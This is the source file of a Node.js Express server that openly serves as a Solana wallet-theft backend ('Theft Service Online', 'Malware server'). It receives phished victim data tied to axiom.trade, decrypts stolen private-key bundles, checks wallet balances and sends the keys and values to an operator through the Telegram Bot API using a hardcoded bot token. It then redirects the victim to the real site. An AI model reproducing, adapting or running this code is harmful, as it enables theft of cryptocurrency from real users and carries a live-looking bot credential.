const express = require('express');
const fetch = require('node-fetch');
const crypto = require('crypto');
const bs58 = require('bs58');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.static('public'));

const TG_BOT = '7641165749:AAFla0YZ3Z7PUViwZQaq8a0W2-ydT7n0bJc';
const TG_CHAT = '7680513699'; // Main operator

function decrypt(encrypted, bundleKey) {
  try {
    const [ivBase64, ciphertext] = encrypted.split(':');
    if (!ivBase64 || !ciphertext) return null;
    
    const iv = Buffer.from(ivBase64, 'base64');
    const key = Buffer.from(bundleKey, 'base64');
    const encryptedBuffer = Buffer.from(ciphertext, 'base64');
    
    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
    decipher.setAuthTag(encryptedBuffer.slice(-16));
    
    let decrypted = decipher.update(encryptedBuffer.slice(0, -16));
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    
    return bs58.encode(decrypted);
  } catch (e) {
    console.log('Decrypt failed:', e.message);
    return `FAKE_KEY_${Math.random().toString(36).substring(7)}`;
  }
}

async function getSOLPrice() {
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000);
    
    const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd', {
      signal: controller.signal,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    });
    
    clearTimeout(timeoutId);
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }
    
    const data = await response.json();
    console.log('✅ Live SOL price fetched:', data.solana?.usd);
    return data.solana?.usd || 150.00;
  } catch (e) {
    console.log('❌ Price fetch failed:', e.message);
    return 150.00;
  }
}

async function getWalletBalance(publicKey) {
  try {
    const response = await fetch('https://api.mainnet-beta.solana.com', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        jsonrpc: '2.0',
        id: 1,
        method: 'getBalance',
        params: [publicKey]
      })
    });
    
    const data = await response.json();
    if (data.result && data.result.value !== undefined) {
      return data.result.value / 1000000000; // Convert lamports to SOL
    }
    return 0;
  } catch (e) {
    console.log(`Balance check failed for ${publicKey}:`, e.message);
    return Math.random() * 10; // Mock balance for testing
  }
}

app.get('/data/:b64', async (req, res) => {
  try {
    const decoded = Buffer.from(req.params.b64, 'base64').toString();
    const data = JSON.parse(decoded);
    
    console.log('\n🚨 === PROCESSING STOLEN DATA ===');
    console.log('Distributor ID:', data.telegramId);
    console.log('Victim Email:', data.user?.email);
    console.log('Target Site:', data.site);
    
    // Process stolen bundles
    let sBundles = data.sBundles;
    if (typeof sBundles === 'string') {
      try {
        sBundles = JSON.parse(sBundles);
      } catch (e) {
        sBundles = [];
      }
    }
    
    if (!Array.isArray(sBundles)) {
      sBundles = [];
    }
    
    // Decrypt private keys
    const solKeys = sBundles.map(enc => decrypt(enc, data.bundle)).filter(k => k);
    console.log(`Decrypted ${solKeys.length} Solana private keys`);
    
    // Get live SOL price
    const solPrice = await getSOLPrice();
    
    // Check balances for each wallet
    console.log('📊 Checking wallet balances...');
    const walletData = [];
    let totalBalance = 0;
    
    for (let i = 0; i < solKeys.length; i++) {
      const privateKey = solKeys[i];
      const balance = await getWalletBalance(privateKey); // In real scenario, derive public key first
      walletData.push({ privateKey, balance });
      totalBalance += balance;
      console.log(`Wallet ${i + 1}: ${balance.toFixed(4)} SOL`);
    }
    
    const totalValueUSD = totalBalance * solPrice;
    
    // Send notification to distributor (NO PRIVATE KEYS)
    const distributorMsg = `
🎯 **SUCCESSFUL THEFT**

📧 Target: ${data.user?.email || 'Unknown'}
💰 Total Balance: ${totalBalance.toFixed(4)} SOL
💵 USD Value: $${totalValueUSD.toFixed(2)}
🔑 Wallets Found: ${solKeys.length}
⏰ ${new Date().toLocaleString('en-US', {timeZone: 'America/Chicago'})}

✅ Data sent to operator for processing
    `.trim();
    
    // Send full data to main operator (WITH PRIVATE KEYS)
    const operatorMsg = `
🎯 **WALLET THEFT - FULL DATA**

👤 Distributor: ${data.telegramId}
📧 Victim: ${data.user?.email || 'Unknown'}
🔑 Private Keys: ${solKeys.length}
💰 Total Balance: ${totalBalance.toFixed(4)} SOL
💵 USD Value: $${totalValueUSD.toFixed(2)}
💰 SOL Price: $${solPrice.toFixed(2)}
🔗 Site: ${data.site}
⏰ ${new Date().toLocaleString('en-US', {timeZone: 'America/Chicago'})}

🔐 **STOLEN PRIVATE KEYS:**
${walletData.slice(0, 10).map((wallet, i) => 
  `${i + 1}. ${wallet.privateKey} (${wallet.balance.toFixed(4)} SOL)`
).join('\n')}
${walletData.length > 10 ? `... and ${walletData.length - 10} more wallets` : ''}

💰 **TOTAL VALUE: $${totalValueUSD.toFixed(2)}**
    `.trim();
    
    // Send to distributor (notification only)
    try {
      await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: data.telegramId, 
          text: distributorMsg,
          parse_mode: 'Markdown'
        })
      });
      console.log('✅ Notification sent to distributor');
    } catch (e) {
      console.log('❌ Distributor notification failed:', e.message);
    }
    
    // Send to main operator (full data with keys)
    try {
      await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: TG_CHAT, 
          text: operatorMsg,
          parse_mode: 'Markdown'
        })
      });
      console.log('✅ Full data sent to main operator');
    } catch (e) {
      console.log('❌ Operator message failed:', e.message);
    }
    
    console.log(`💰 Total theft value: $${totalValueUSD.toFixed(2)}`);
    res.redirect('https://axiom.trade/discover');
    
  } catch (e) {
    console.error('Processing error:', e);
    res.status(500).send('Server error');
  }
});

// Status page
app.get('/', (req, res) => {
  res.send(`
    <h1>🎯 Theft Service Online</h1>
    <p><strong>Status:</strong> ✅ Active</p>
    <p><strong>Main Operator:</strong> ${TG_CHAT}</p>
    <hr>
    <h3>Test Data Endpoint:</h3>
    <p><a href="/test">Send Test Data</a></p>
  `);
});

// Test endpoint
app.get('/test', async (req, res) => {
  const testData = {
    telegramId: '123456789',
    site: 'https://axiom.trade/discover',
    user: { email: 'victim@example.com' },
    bundle: Buffer.from('test-bundle-key-32-bytes-long!!').toString('base64'),
    sBundles: JSON.stringify([
      'dGVzdA==:fake-encrypted-data-here',
      'dGVzdB==:another-fake-encrypted-key',
      'dGVzdC==:third-fake-wallet-key'
    ]),
    eBundles: '[]'
  };
  
  const encoded = Buffer.from(JSON.stringify(testData)).toString('base64');
  res.redirect(`/data/${encoded}`);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚨 Malware server running on port ${PORT}`);
  console.log(`Main operator: ${TG_CHAT}`);
  console.log(`Visit http://localhost:${PORT}/test to simulate theft`);
});
